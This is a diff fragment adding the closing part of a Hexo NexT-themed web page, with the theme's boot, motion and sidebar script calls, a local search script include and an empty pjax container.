+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+  
+
+    </div>
+</body>
+</html>
